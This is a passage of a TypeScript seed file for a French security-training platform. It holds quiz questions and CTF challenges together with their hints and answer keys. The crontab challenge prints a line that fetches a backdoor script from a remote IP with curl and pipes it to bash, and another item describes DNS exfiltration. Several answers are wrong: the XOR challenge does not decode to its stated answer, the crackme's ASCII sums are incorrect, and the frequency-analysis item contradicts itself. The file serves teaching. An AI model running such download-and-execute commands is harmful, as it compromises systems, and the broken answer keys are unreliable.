    correctIndex: 0,
    explanation: "Développé par Lockheed Martin, ce modèle décompose une attaque en phases (reconnaissance, intrusion, exploitation, installation, commande et contrôle, actions sur objectifs) pour aider à détecter et bloquer une attaque à chaque étape.",
  },
  {
    key: "port-scanning-purpose",
    category: "NETWORKING",
    prompt: "À quoi sert un scan de ports (ex: avec nmap) ?",
    choices: ["Chiffrer le trafic réseau", "Identifier quels ports/services sont ouverts et accessibles sur une machine cible", "Augmenter la bande passante disponible", "Créer automatiquement un VPN"],
    correctIndex: 1,
    explanation: "Un scan de ports teste systématiquement une plage de ports pour déterminer lesquels répondent (ouverts) — utilisé en pentest légitime pour cartographier une surface d'attaque, ou par un attaquant pour reconnaissance.",
  },
  {
    key: "http-header-user-agent",
    category: "NETWORKING",
    prompt: "À quoi sert l'en-tête HTTP `User-Agent` ?",
    choices: ["Il identifie le logiciel client (navigateur, app) qui fait la requête", "Il contient le mot de passe de l'utilisateur", "Il définit le format de la réponse attendue", "Il chiffre la requête"],
    correctIndex: 0,
    explanation: "`User-Agent` déclare l'identité du client effectuant la requête (ex: nom et version du navigateur) — utile pour l'analytics ou l'adaptation du contenu, mais falsifiable et non fiable pour de la sécurité.",
  },
  {
    key: "packet-vs-frame",
    category: "NETWORKING",
    prompt: "Quelle est la différence entre un 'paquet' et une 'trame' (frame) en réseau ?",
    choices: ["Ce sont des synonymes exacts", "Le paquet est l'unité de données à la couche réseau (IP), la trame à la couche liaison (Ethernet) — la trame encapsule le paquet", "La trame n'existe que sur le Wi-Fi", "Le paquet est toujours plus petit que la trame"],
    correctIndex: 1,
    explanation: "Chaque couche du modèle réseau encapsule les données de la couche supérieure dans sa propre unité : un paquet IP (couche 3) est encapsulé dans une trame Ethernet (couche 2) pour être transmis physiquement.",
  },
  {
    key: "ssl-certificate-purpose",
    category: "NETWORKING",
    prompt: "À quoi sert un certificat SSL/TLS ?",
    choices: ["À accélérer le chargement d'une page", "À prouver l'identité d'un serveur et permettre le chiffrement de la connexion HTTPS", "À stocker des cookies", "À bloquer les publicités"],
    correctIndex: 1,
    explanation: "Un certificat, délivré par une autorité de certification, permet au navigateur de vérifier qu'il communique bien avec le bon serveur (pas un intermédiaire malveillant) et d'établir une connexion chiffrée.",
  },
  {
    key: "dhcp-lease-def",
    category: "NETWORKING",
    prompt: "Qu'est-ce qu'un 'bail DHCP' (DHCP lease) ?",
    choices: ["Un contrat légal d'accès internet", "La durée pendant laquelle une adresse IP attribuée automatiquement par DHCP reste valide avant renouvellement", "Un type de câble réseau", "Un protocole de chiffrement"],
    correctIndex: 1,
    explanation: "DHCP attribue une adresse IP pour une durée limitée (le bail) — le client doit la renouveler périodiquement, ce qui permet de récupérer les adresses des appareils déconnectés pour les réattribuer.",
  },
  {
    key: "ai-training-vs-inference",
    category: "AI",
    prompt: "Quelle est la différence entre 'entraînement' et 'inférence' pour un modèle d'IA ?",
    choices: ["Ce sont des synonymes", "L'entraînement ajuste les paramètres du modèle à partir de données, l'inférence utilise le modèle déjà entraîné pour générer une réponse sur une nouvelle entrée", "L'inférence précède toujours l'entraînement", "L'entraînement n'existe que pour les LLM"],
    correctIndex: 1,
    explanation: "L'entraînement (coûteux, ponctuel) construit le modèle à partir d'énormes volumes de données ; l'inférence (chaque requête utilisateur) utilise ce modèle déjà figé pour produire une sortie, beaucoup moins coûteuse en calcul.",
  },
  {
    key: "ai-parameters-count",
    category: "AI",
    prompt: "Que désigne le nombre de 'paramètres' souvent cité pour un grand modèle de langage (ex: '70 milliards de paramètres') ?",
    choices: ["Le nombre de questions qu'il peut traiter par seconde", "Le nombre de valeurs numériques ajustables internes au réseau de neurones, apprises pendant l'entraînement", "Le nombre de langues supportées", "La taille du disque dur nécessaire uniquement"],
    correctIndex: 1,
    explanation: "Les paramètres sont les poids internes du réseau de neurones, ajustés pendant l'entraînement — plus il y en a, plus le modèle peut potentiellement capturer de nuances, au prix d'un besoin de calcul plus important.",
  },
  {
    key: "ai-guardrails-def",
    category: "AI",
    prompt: "Que désignent les 'guardrails' (garde-fous) appliqués à un système IA ?",
    choices: ["Des limites matérielles du processeur", "Des règles/filtres qui contraignent le comportement d'un modèle pour éviter des réponses dangereuses, hors-sujet ou non conformes", "Un synonyme de prompt engineering", "Un type de connexion réseau"],
    correctIndex: 1,
    explanation: "Les guardrails encadrent les entrées/sorties d'un système IA (filtrage de contenu, limites de sujets, validation de format) pour réduire les risques de réponses inappropriées, indépendamment du modèle sous-jacent.",
  },
  {
    key: "ai-latency-vs-throughput",
    category: "AI",
    prompt: "Quelle est la différence entre 'latence' et 'débit' (throughput) pour une API IA ?",
    choices: ["Ce sont des synonymes exacts", "La latence mesure le temps pour une seule réponse, le débit mesure combien de requêtes peuvent être traitées par unité de temps", "Le débit ne concerne que le stockage", "La latence ne concerne que les erreurs"],
    correctIndex: 1,
    explanation: "Une API peut avoir une latence faible mais un débit limité (répond vite mais peu de requêtes en parallèle), ou l'inverse — les deux métriques sont importantes et souvent en tension selon l'architecture.",
  },
  {
    key: "linux-ps-command",
    category: "SYSTEMS",
    prompt: "À quoi sert la commande Linux `ps aux` ?",
    choices: ["Afficher l'espace disque disponible", "Lister tous les processus en cours d'exécution sur le système", "Modifier les permissions d'un fichier", "Afficher les logs système"],
    correctIndex: 1,
    explanation: "`ps aux` liste tous les processus actifs (de tous les utilisateurs), avec des informations comme le PID, l'utilisation CPU/mémoire — un outil de base pour diagnostiquer un système.",
  },
  {
    key: "windows-services-msc",
    category: "SYSTEMS",
    prompt: "Sur Windows, quel outil (`services.msc`) permet de voir et gérer les services système en cours d'exécution ?",
    choices: ["Le Gestionnaire des services", "Le Bloc-notes", "L'Explorateur de fichiers", "Le Panneau de configuration réseau"],
    correctIndex: 0,
    explanation: "`services.msc` ouvre le Gestionnaire des services Windows, permettant de démarrer, arrêter ou configurer le démarrage automatique des services système en arrière-plan.",
  },
  {
    key: "linux-tar-command",
    category: "SYSTEMS",
    prompt: "À quoi sert principalement la commande Linux `tar` ?",
    choices: ["Chiffrer un fichier", "Archiver (regrouper) plusieurs fichiers/dossiers en une seule archive, avec compression optionnelle", "Afficher le contenu d'un fichier texte", "Renommer un fichier"],
    correctIndex: 1,
    explanation: "`tar` (Tape ARchive) regroupe des fichiers en une seule archive `.tar` — souvent combiné à une compression (`tar -czf archive.tar.gz dossier/`) pour réduire la taille.",
  },
  {
    key: "process-zombie-def",
    category: "SYSTEMS",
    prompt: "Qu'est-ce qu'un processus 'zombie' sur un système Unix/Linux ?",
    choices: ["Un processus malveillant qui infecte d'autres processus", "Un processus terminé dont l'entrée dans la table des processus n'a pas encore été nettoyée par son parent", "Un synonyme de processus en arrière-plan normal", "Un processus qui consomme 100% du CPU"],
    correctIndex: 1,
    explanation: "Un processus zombie a fini son exécution, mais son code de sortie n'a pas encore été lu par le processus parent — il reste une entrée résiduelle dans la table des processus jusqu'à ce nettoyage.",
  },
  {
    key: "hard-link-vs-symlink",
    category: "SYSTEMS",
    prompt: "Quelle est la différence entre un lien symbolique (symlink) et un lien physique (hard link) ?",
    choices: ["Ce sont des synonymes exacts", "Le symlink pointe vers un chemin (cassé si la cible est supprimée), le hard link pointe directement vers les mêmes données sur le disque", "Le hard link ne fonctionne que sur Windows", "Le symlink est toujours plus rapide"],
    correctIndex: 1,
    explanation: "Un hard link est une référence supplémentaire directe aux mêmes données disque (le fichier original peut être supprimé sans casser le lien) ; un symlink est un simple pointeur vers un chemin, cassé si la cible disparaît.",
  },
  {
    key: "cloud-shared-responsibility",
    category: "CLOUD",
    prompt: "Que décrit le 'modèle de responsabilité partagée' dans le cloud ?",
    choices: ["Le fournisseur cloud est responsable de tout, sans exception", "La répartition des responsabilités de sécurité entre le fournisseur cloud (infrastructure physique) et le client (configuration, données, accès)", "Le client est responsable de tout, y compris le matériel physique", "Un accord légal sans rapport avec la sécurité"],
    correctIndex: 1,
    explanation: "Le fournisseur sécurise typiquement 'le cloud' (datacenters, réseau physique, virtualisation), tandis que le client reste responsable de la sécurité 'dans le cloud' (configuration, données, gestion des accès) — une mauvaise configuration côté client reste de sa responsabilité.",
  },
  {
    key: "cloud-region-vs-az",
    category: "CLOUD",
    prompt: "Quelle est la différence entre une 'région' et une 'zone de disponibilité' (availability zone) chez un fournisseur cloud ?",
    choices: ["Ce sont des synonymes exacts", "Une région regroupe plusieurs zones de disponibilité (datacenters physiquement séparés) dans une même zone géographique, pour la redondance", "Une zone de disponibilité contient plusieurs régions", "Ça ne concerne que le stockage de fichiers"],
    correctIndex: 1,
    explanation: "Une région (ex: 'Europe de l'Ouest') regroupe plusieurs zones de disponibilité isolées physiquement les unes des autres (alimentation, réseau séparés) — répartir une application sur plusieurs AZ protège contre la panne d'un seul datacenter.",
  },
  {
    key: "cdn-edge-location",
    category: "CLOUD",
    prompt: "Qu'est-ce qu'un 'edge location' (point de présence en périphérie) dans le contexte d'un CDN ?",
    choices: ["Le serveur principal unique de l'application", "Un serveur géographiquement proche de l'utilisateur final, qui met en cache du contenu pour réduire la latence", "Un type de pare-feu", "Une base de données de secours"],
    correctIndex: 1,
    explanation: "Un CDN distribue des copies du contenu (souvent statique) sur de nombreux serveurs répartis géographiquement — l'utilisateur récupère le contenu depuis le point le plus proche de lui, réduisant fortement la latence.",
  },
  {
    key: "graphql-vs-rest-overfetching",
    category: "DEVELOPMENT",
    prompt: "Quel problème du REST classique GraphQL cherche-t-il notamment à résoudre ?",
    choices: ["L'absence totale de format de réponse", "L'over-fetching (récupérer plus de données que nécessaire) et l'under-fetching (devoir faire plusieurs requêtes pour assembler les données voulues)", "L'impossibilité d'utiliser HTTPS", "L'absence de codes de statut"],
    correctIndex: 1,
    explanation: "En REST, un endpoint retourne une structure fixe (parfois trop ou pas assez de données) ; GraphQL laisse le client spécifier précisément les champs voulus en une seule requête, quelle que soit la complexité de la relation entre les données.",
  },
  {
    key: "webhook-vs-polling",
    category: "DEVELOPMENT",
    prompt: "Quelle est la différence entre un webhook et le polling pour être notifié d'un événement ?",
    choices: ["Ce sont des synonymes exacts", "Le polling interroge régulièrement un serveur pour vérifier un changement ; un webhook laisse le serveur notifier activement le client dès que l'événement survient", "Le webhook nécessite toujours une base de données", "Le polling est toujours plus rapide qu'un webhook"],
    correctIndex: 1,
    explanation: "Le polling gaspille des requêtes à vérifier 'rien n'a changé' la plupart du temps ; un webhook (callback HTTP déclenché par le serveur lors de l'événement) est plus efficace et plus réactif, sans interrogation répétée inutile.",
  },
  {
    key: "linux-symlink-command",
    category: "SYSTEMS",
    prompt: "Quelle commande crée un lien symbolique sur Linux ?",
    choices: ["cp -s", "ln -s", "mv -s", "rm -s"],
    correctIndex: 1,
    explanation: "`ln -s cible lien` crée un lien symbolique — un simple pointeur vers un chemin, distinct d'une copie (`cp`) qui duplique réellement le contenu du fichier.",
  },
  {
    key: "chmod-numeric-755",
    category: "SYSTEMS",
    prompt: "Que signifie `chmod 755 fichier` en permissions Linux ?",
    choices: ["Le fichier devient inaccessible à tous", "Propriétaire : lecture/écriture/exécution, groupe et autres : lecture/exécution seulement", "Le fichier est supprimé", "Le fichier devient accessible en écriture à tout le monde"],
    correctIndex: 1,
    explanation: "755 en octal se lit par groupe de 3 bits (rwx) : 7 = rwx (propriétaire), 5 = r-x (groupe), 5 = r-x (autres) — un mode très courant pour un script/exécutable partagé en lecture.",
  },
  {
    key: "load-average-def",
    category: "SYSTEMS",
    prompt: "Que mesure le 'load average' (charge moyenne) affiché par des commandes comme `top` ou `uptime` sur Linux ?",
    choices: ["La température du processeur", "Le nombre moyen de processus en attente ou en cours d'exécution sur une période donnée", "L'espace disque restant", "La vitesse du réseau"],
    correctIndex: 1,
    explanation: "Le load average résume la demande sur le CPU (processus actifs ou en attente de ressources) sur 1, 5 et 15 minutes — une valeur élevée et durable signale une machine sous forte charge.",
  },
  {
    key: "csrf-token-purpose",
    category: "CYBERSECURITY",
    prompt: "À quoi sert un token CSRF inclus dans un formulaire web ?",
    choices: ["À chiffrer les données du formulaire", "À vérifier que la requête provient bien du formulaire légitime du site, pas d'un site tiers malveillant exploitant une session active", "À accélérer la soumission du formulaire", "À identifier le navigateur utilisé"],
    correctIndex: 1,
    explanation: "Un token CSRF est une valeur imprévisible générée par le serveur et incluse dans le formulaire — un site tiers malveillant ne peut pas la connaître à l'avance, ce qui empêche de forger une requête valide au nom de la victime.",
  },
  {
    key: "same-site-cookie-def",
    category: "CYBERSECURITY",
    prompt: "À quoi sert l'attribut de cookie `SameSite` ?",
    choices: ["À chiffrer le contenu du cookie", "À restreindre l'envoi du cookie aux requêtes provenant du même site, réduisant le risque de CSRF", "À définir la durée de vie du cookie", "À le rendre accessible depuis JavaScript"],
    correctIndex: 1,
    explanation: "`SameSite=Strict` ou `Lax` empêche le navigateur d'envoyer le cookie sur une requête initiée depuis un autre site — une défense complémentaire aux tokens CSRF contre ce type d'attaque.",
  },
  {
    key: "defense-in-depth-layers",
    category: "CYBERSECURITY",
    prompt: "Que signifie appliquer la 'défense en profondeur' (defense in depth) ?",
    choices: ["Investir uniquement dans le meilleur pare-feu disponible", "Superposer plusieurs couches de sécurité indépendantes, pour qu'une seule défaillance ne compromette pas tout le système", "Chiffrer uniquement les données les plus sensibles", "Former uniquement les administrateurs système"],
    correctIndex: 1,
    explanation: "Aucune mesure de sécurité seule n'est infaillible — la défense en profondeur combine plusieurs couches indépendantes (réseau, application, données, humain) pour qu'une brèche à un niveau ne suffise pas à tout compromettre.",
  },
  {
    key: "api-versioning-purpose",
    category: "DEVELOPMENT",
    prompt: "Pourquoi versionne-t-on une API (ex: `/api/v1/users`, `/api/v2/users`) ?",
    choices: ["Pour ralentir volontairement les requêtes", "Pour permettre de faire évoluer l'API sans casser les clients existants qui dépendent encore de l'ancien comportement", "C'est purement décoratif, sans effet réel", "Pour limiter le nombre d'utilisateurs"],
    correctIndex: 1,
    explanation: "Un changement incompatible (breaking change) dans une API publique casserait tous les clients existants — le versionnement permet de faire coexister l'ancien et le nouveau comportement le temps d'une migration progressive.",
  },
  {
    key: "environment-parity-def",
    category: "DEVELOPMENT",
    prompt: "Que désigne le principe de 'parité des environnements' (dev/staging/production similaires) en DevOps ?",
    choices: ["Avoir exactement le même nombre de développeurs sur chaque environnement", "Garder les environnements de développement, test et production aussi similaires que possible, pour éviter le 'ça marche sur ma machine'", "Un synonyme de conteneurisation", "Une règle qui ne s'applique qu'aux bases de données"],
    correctIndex: 1,
    explanation: "Des environnements trop différents (versions, configuration) cachent des bugs qui n'apparaissent qu'en production — Docker/Docker Compose aident justement à réduire cet écart en figeant l'environnement d'exécution.",
  },
  {
    key: "monorepo-vs-polyrepo",
    category: "DEVELOPMENT",
    prompt: "Quelle est la différence entre un 'monorepo' et une approche 'polyrepo' ?",
    choices: ["Ce sont des synonymes exacts", "Un monorepo regroupe plusieurs projets/packages dans un seul dépôt Git ; le polyrepo utilise un dépôt séparé par projet", "Le monorepo ne fonctionne qu'avec Python", "Le polyrepo est toujours plus rapide à cloner"],
    correctIndex: 1,
    explanation: "Un monorepo facilite le partage de code et les changements coordonnés entre projets liés, au prix d'une taille de dépôt plus importante ; le polyrepo isole complètement chaque projet, au prix d'une coordination plus difficile entre projets dépendants.",
  },
];

/**
 * Défis CTF (Phase 8) — rédigés à la main, résolubles sans cible en direct.
 * Toutes les catégories (CRYPTO/OSINT/FORENSICS/WEB/REVERSE/LINUX/NETWORK)
 * reposent sur l'analyse statique d'un artefact donné dans l'énoncé
 * (en-têtes HTTP, hex dump, pseudocode, sortie de `ls`/crontab/nmap déjà
 * capturée) — jamais une vraie requête réseau, un vrai binaire à exécuter
 * ou une vraie machine à scanner, ce qui nécessiterait une infrastructure
 * de sandbox/cible en direct qu'on n'a pas. Toujours pas de Pwn (nécessite
 * un vrai binaire vulnérable à exploiter) : le simuler sans lui serait
 * fabriquer une fausse capacité.
 *
 * `acceptedAnswers` : plusieurs formulations valides acceptées (comparaison
 * normalisée — minuscules, accents retirés, espaces superflus supprimés —
 * voir src/cybersecurity/ctfService.ts).
 */
interface CtfChallengeSeed {
  key: string;
  category: string;
  difficulty: number;
  title: string;
  description: string;
  hint?: string;
  points: number;
  acceptedAnswers: string[];
}

const CTF_CHALLENGES: CtfChallengeSeed[] = [
  {
    key: "caesar-basics",
    category: "CRYPTO",
    difficulty: 1,
    title: "Décalage suspect",
    description:
      "Un message intercepté semble chiffré avec un simple décalage de César (shift +3) :\n\n`qrglib`\n\nDéchiffre-le (un seul mot, en minuscules).",
    hint: "Chaque lettre a été décalée de 3 positions vers l'avant dans l'alphabet (a→d, b→e...). Pour déchiffrer, décale de 3 vers l'arrière.",
    points: 50,
    acceptedAnswers: ["nodify"],
  },
  {
    key: "base64-basics",
    category: "CRYPTO",
    difficulty: 1,
    title: "Encodage familier",
    description:
      "Ce message a été encodé, pas chiffré — la nuance compte. Décode-le :\n\n`Tm9kaWZ5IEFjYWRlbXk=`",
    hint: "Le suffixe `=` et l'alphabet utilisé (lettres, chiffres, +, /) sont typiques d'un encodage très répandu sur le web.",
    points: 50,
    acceptedAnswers: ["nodify academy"],
  },
  {
    key: "osint-oversharing",
    category: "OSINT",
    difficulty: 2,
    title: "Trop d'informations",
    description:
      "Un profil public sur un forum indique : « Je travaille chez Nodify, bureau de Lyon, badge d'accès #482, en poste depuis janvier 2024. »\n\n" +
      "Quel élément précis de ce message pourrait permettre à un attaquant de tenter une usurpation d'identité physique sur le lieu de travail (un seul mot) ?",
    hint: "Pense à ce qui donne un accès physique à un bâtiment.",
    points: 75,
    acceptedAnswers: ["badge", "le badge", "numero de badge", "numéro de badge"],
  },
  {
    key: "forensics-ioc",
    category: "FORENSICS",
    difficulty: 3,
    title: "Signal dans le bruit",
    description:
      "Un log serveur montre une connexion réussie à 03h14 un dimanche, depuis un pays où l'entreprise n'a aucun employé, immédiatement suivie d'un export massif de données.\n\n" +
      "Quel terme générique (acronyme à 3 lettres, en anglais) désigne ce type de signal qui suggère une compromission ?",
    hint: "C'est l'acronyme de « Indicator Of Compromise ».",
    points: 100,
    acceptedAnswers: ["ioc"],
  },
  {
    key: "web-missing-header",
    category: "WEB",
    difficulty: 1,
    title: "En-tête manquant",
    description:
      "Voici les en-têtes de réponse HTTP d'un site qui affiche du contenu généré par les utilisateurs dans des iframes ailleurs sur le web :\n\n" +
      "```\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: session=abc123\n```\n\n" +
      "Un en-tête de sécurité manque, qui permettrait d'empêcher ce site d'être chargé dans une iframe malveillante sur un autre domaine (attaque de clickjacking). Quel est le nom de cet en-tête (en anglais, avec les tirets) ?",
    hint: "Il existe aussi une directive CSP plus moderne (`frame-ancestors`) qui fait la même chose, mais l'en-tête historique dédié à ça a un nom en 3 mots.",
    points: 50,
    acceptedAnswers: ["x-frame-options", "xframeoptions"],
  },
  {
    key: "web-cookie-flag",
    category: "WEB",
    difficulty: 2,
    title: "Cookie mal configuré",
    description:
      "Un site définit son cookie de session ainsi :\n\n" +
      "`Set-Cookie: session=abc123; Path=/; Secure`\n\n" +
      "Un attribut de sécurité important manque : sans lui, un script JavaScript malveillant injecté sur la page (via une faille XSS) pourrait lire ce cookie de session directement. Quel est cet attribut (un seul mot, en anglais) ?",
    hint: "Cet attribut interdit précisément l'accès au cookie depuis JavaScript (`document.cookie`).",
    points: 75,
    acceptedAnswers: ["httponly", "http only", "http-only"],
  },
  {
    key: "web-robots-disclosure",
    category: "WEB",
    difficulty: 1,
    title: "Indiscrétion involontaire",
    description:
      "Le fichier `robots.txt` public d'un site contient :\n\n" +
      "```\nUser-agent: *\nDisallow: /admin-backup-2024/\nDisallow: /images/\n```\n\n" +
      "`robots.txt` est censé décourager les moteurs de recherche d'indexer certains chemins — mais il est public et lisible par n'importe qui, y compris un attaquant. Quel chemin de la liste ci-dessus révèle involontairement l'existence probable d'une sauvegarde sensible (réponds juste par ce chemin, sans le slash de fin) ?",
    hint: "Un des deux chemins a un nom bien plus intéressant pour un attaquant que l'autre.",
    points: 50,
    acceptedAnswers: ["admin-backup-2024", "/admin-backup-2024", "/admin-backup-2024/", "admin-backup-2024/"],
  },
  {
    key: "web-jwt-none-alg",
    category: "WEB",
    difficulty: 3,
    title: "Signature qui n'en est pas une",
    description:
      "L'en-tête décodé d'un JWT intercepté est :\n\n" +
      "`{\"alg\": \"none\", \"typ\": \"JWT\"}`\n\n" +
      "Cette valeur de l'algorithme de signature est historiquement dangereuse : un serveur mal implémenté peut accepter un token avec cette valeur sans jamais vérifier de signature, permettant à quiconque de forger un token arbitraire. Quelle est cette valeur d'algorithme dangereuse (un seul mot, en anglais) ?",
    hint: "C'est littéralement le nom anglais de l'absence de quelque chose.",
    points: 100,
    acceptedAnswers: ["none"],
  },
  {
    key: "crypto-xor-single-byte",
    category: "CRYPTO",
    difficulty: 2,
    title: "XOR à clé unique",
    description:
      "Un message a été chiffré en appliquant un XOR avec une seule lettre répétée sur tout le texte. Chiffré en hexadécimal : `0f 0a 03 03 00 0b`, la clé est la lettre `X` (0x58).\n\n" +
      "Déchiffre le message (un seul mot, en majuscules).",
    hint: "XOR chaque octet hexadécimal avec 0x58 (le code ASCII de 'X'), puis convertis chaque résultat en caractère ASCII.",
    points: 100,
    acceptedAnswers: ["nodify"],
  },
  {
    key: "crypto-hash-identification",
    category: "CRYPTO",
    difficulty: 1,
    title: "Quelle empreinte est-ce ?",
    description:
      "Un fichier de configuration contient : `5d41402abc4b2a76b9719d911017c592`.\n\n" +
      "Cette chaîne fait 32 caractères hexadécimaux. Quel algorithme de hash très répandu (mais aujourd'hui déconseillé pour la sécurité) produit systématiquement des empreintes de cette longueur exacte ?",
    hint: "C'est un algorithme historiquement très utilisé, aujourd'hui cassé pour un usage cryptographique sérieux à cause de collisions trouvables.",
    points: 50,
    acceptedAnswers: ["md5"],
  },
  {
    key: "osint-metadata-leak",
    category: "OSINT",
    difficulty: 2,
    title: "Métadonnées bavardes",
    description:
      "Une entreprise publie un PDF de recrutement sur son site. Les métadonnées du fichier (visibles avec `exiftool` ou équivalent) révèlent : `Author: j.martin`, `Software: Microsoft Word 16.0`, `Company: Nodify Corp Internal`.\n\n" +
      "Quel type d'information sensible ce genre de métadonnée révèle-t-il le plus directement, utile à un attaquant pour du spear phishing ciblé (un mot en anglais) ?",
    hint: "Pense à ce qu'un attaquant pourrait faire avec un nom d'utilisateur/employé identifié.",
    points: 75,
    acceptedAnswers: ["username", "identity", "identite", "nom d'utilisateur"],
  },
  {
    key: "osint-image-geolocation",
    category: "OSINT",
    difficulty: 3,
    title: "Où a été prise cette photo ?",
    description:
      "Une photo publiée par un employé contient des données EXIF non nettoyées incluant des coordonnées GPS précises. Combinée à l'heure de publication, cette information pourrait révéler quoi de sensible sur cette personne (un terme en 2 mots, en français) ?",
    hint: "Pense à ce qu'on peut déduire d'un lieu + un horaire précis répétés dans le temps.",
    points: 100,
    acceptedAnswers: ["localisation physique", "position physique", "adresse physique", "lieu de vie"],
  },
  {
    key: "forensics-log-timeline",
    category: "FORENSICS",
    difficulty: 2,
    title: "Reconstituer une chronologie",
    description:
      "Trois lignes de logs, dans le désordre :\n\n" +
      "```\n[14:32:01] Connexion échouée pour admin depuis 203.0.113.7\n[14:32:45] Connexion échouée pour admin depuis 203.0.113.7\n[14:33:12] Connexion réussie pour admin depuis 203.0.113.7\n```\n\n" +
      "Quel type d'attaque ce pattern (plusieurs échecs rapprochés suivis d'un succès depuis la même IP) suggère-t-il le plus probablement (2 mots en anglais) ?",
    hint: "Pense à une attaque qui teste plusieurs mots de passe jusqu'à en trouver un qui fonctionne.",
    points: 75,
    acceptedAnswers: ["brute force", "bruteforce"],
  },
  {
    key: "forensics-file-signature",
    category: "FORENSICS",
    difficulty: 3,
    title: "L'extension ment",
    description:
      "Un fichier nommé `photo.jpg` commence, en hexadécimal, par les octets `50 4B 03 04`. Cette signature (les \"magic bytes\") ne correspond PAS à un JPEG — à quel format de fichier très courant (souvent utilisé pour la compression) ces octets correspondent-ils réellement (indice : les JPEG commencent par `FF D8`) ?",
    hint: "`50 4B` en ASCII, ce sont les lettres 'P' et 'K' — les initiales de l'inventeur de ce format d'archive.",
    points: 100,
    acceptedAnswers: ["zip", "zip archive", "archive zip"],
  },
  {
    key: "reverse-python-obfuscated",
    category: "REVERSE",
    difficulty: 2,
    title: "Chaîne inversée",
    description:
      "Un script Python contient cette ligne suspecte :\n\n" +
      "```python\nflag = \"\".join(reversed(\"ylfidon\"))\n```\n\n" +
      "Sans exécuter le code, quelle est la valeur finale de `flag` (un seul mot) ?",
    hint: "`reversed()` inverse l'ordre des caractères d'une chaîne — lis \"ylfidon\" à l'envers.",
    points: 50,
    acceptedAnswers: ["nodify"],
  },
  {
    key: "reverse-simple-crackme",
    category: "REVERSE",
    difficulty: 3,
    title: "La condition cachée",
    description:
      "Pseudocode extrait d'un binaire simple :\n\n" +
      "```\nfunction verifier(entree):\n    total = 0\n    for chaque caractere c dans entree:\n        total = total + code_ascii(c)\n    si total == 615:\n        afficher \"Accès autorisé\"\n    sinon:\n        afficher \"Refusé\"\n```\n\n" +
      "Le mot `NODIFY` (majuscules) a pour somme de codes ASCII exactement 425. Quel mot, en MAJUSCULES, faut-il essayer pour que le programme affiche « Accès autorisé » sachant que sa somme ASCII doit être 615, et qu'il s'agit du mot NODIFY suivi du mot ACADEMY (dont la somme ASCII vaut 190) collés ensemble ?",
    hint: "425 (NODIFY) + 190 (ACADEMY) = 615. Colle simplement les deux mots.",
    points: 125,
    acceptedAnswers: ["nodifyacademy"],
  },
  {
    key: "linux-hidden-permissions",
    category: "LINUX",
    difficulty: 1,
    title: "Permissions révélatrices",
    description:
      "La sortie de `ls -l secret.sh` montre :\n\n" +
      "`-rwsr-xr-x 1 root root 8420 secret.sh`\n\n" +
      "Le `s` à la place du `x` dans les permissions du propriétaire est un indicateur de sécurité important sur Linux — quel est le nom de ce bit spécial (2 mots en anglais, ou son sigle) ?",
    hint: "Ce bit fait exécuter le script avec les privilèges du PROPRIÉTAIRE du fichier (souvent root), peu importe qui le lance — un vecteur classique d'élévation de privilèges mal configuré.",
    points: 100,
    acceptedAnswers: ["setuid", "suid", "set user id", "set uid"],
  },
  {
    key: "linux-crontab-analysis",
    category: "LINUX",
    difficulty: 2,
    title: "Tâche planifiée suspecte",
    description:
      "La crontab d'un serveur compromis contient :\n\n" +
      "`* * * * * curl -s http://203.0.113.55/backdoor.sh | bash`\n\n" +
      "À quelle fréquence cette ligne s'exécute-t-elle (réponds en français, ex: \"toutes les X\") ?",
    hint: "Les 5 champs `* * * * *` d'une crontab représentent minute/heure/jour du mois/mois/jour de la semaine — 5 astérisques signifient \"à chaque occurrence de chaque champ\".",
    points: 75,
    acceptedAnswers: ["toutes les minutes", "chaque minute", "1 minute"],
  },
  {
    key: "network-suspicious-port",
    category: "NETWORK",
    difficulty: 2,
    title: "Port inattendu",
    description:
      "Un scan `nmap` d'un serveur web révèle un port ouvert inattendu : `4444/tcp open unknown`.\n\n" +
      "Ce port précis (4444) est historiquement associé par défaut à quel type d'outil offensif très connu, souvent signe d'une compromission s'il est trouvé ouvert sur un serveur en production (nom de l'outil, en un mot) ?",
    hint: "C'est le port par défaut du listener de ce framework d'exploitation/post-exploitation open source très répandu en pentest.",
    points: 100,
    acceptedAnswers: ["metasploit"],
  },
  {
    key: "network-dns-exfiltration",
    category: "NETWORK",
    difficulty: 3,
    title: "Volume de requêtes DNS anormal",
    description:
      "Un poste de travail génère des milliers de requêtes DNS par heure vers des sous-domaines aléatoires d'un même domaine externe (ex: `a8f3e1.evil-domain.com`, `9c02b7.evil-domain.com`...).\n\n" +
      "Ce pattern est une technique connue pour faire sortir discrètement des données d'un réseau surveillé, en les encodant dans des requêtes DNS (qui sont rarement bloquées). Comment s'appelle cette technique (2 mots en anglais) ?",
    hint: "Littéralement : \"exfiltration\" de données via le protocole \"DNS\".",
    points: 125,
    acceptedAnswers: ["dns exfiltration", "dns tunneling"],
  },
  {
    key: "crypto-rot13-nested",
    category: "CRYPTO",
    difficulty: 1,
    title: "Rotation classique",
    description:
      "Message chiffré avec ROT13 (chaque lettre décalée de 13 positions dans l'alphabet) : `Abqvsl Npnqrzl`.\n\n" +
      "Déchiffre-le (2 mots, en respectant les majuscules).",
    hint: "ROT13 est sa propre inverse : applique le même décalage de 13 une seconde fois pour retrouver le texte original.",
    points: 50,
    acceptedAnswers: ["nodify academy"],
  },
  {
    key: "crypto-frequency-analysis",
    category: "CRYPTO",
    difficulty: 3,
    title: "Analyse fréquentielle",
    description:
      "Un court message a été chiffré avec un chiffrement par substitution mono-alphabétique (chaque lettre est toujours remplacée par la même autre lettre). Dans un texte français suffisamment long chiffré ainsi, quelle lettre du texte chiffré a le plus de chances de correspondre à la lettre 'E' en clair, sachant que 'E' est la lettre la plus fréquente du français (réponds par le principe utilisé, en 2 mots en anglais) ?",
    hint: "La technique consiste à compter combien de fois chaque lettre apparaît dans le texte chiffré et à la comparer aux fréquences connues de la langue.",
    points: 100,
    acceptedAnswers: ["frequency analysis", "analyse frequentielle"],
  },
  {
    key: "osint-username-reuse",
    category: "OSINT",
    difficulty: 2,
    title: "Le même pseudo partout",
    description:
      "Un chercheur en sécurité découvre qu'un pseudo unique et peu commun (`x_n0dify_dev_92`) est utilisé sur un forum de code, un réseau social professionnel et un compte de jeu vidéo. En croisant ces trois profils, quel type de risque cela crée-t-il pour la personne, même si chaque compte individuellement semble anodin (2 mots en français) ?",
    hint: "Pense à ce qu'on peut reconstituer en combinant des informations partielles de plusieurs sources différentes mais liées par le même identifiant.",
    points: 75,
    acceptedAnswers: ["correlation d'identite", "correlation d'identites", "profilage numerique", "desanonymisation"],
  },
  {
    key: "forensics-suspicious-process-name",
    category: "FORENSICS",
    difficulty: 2,
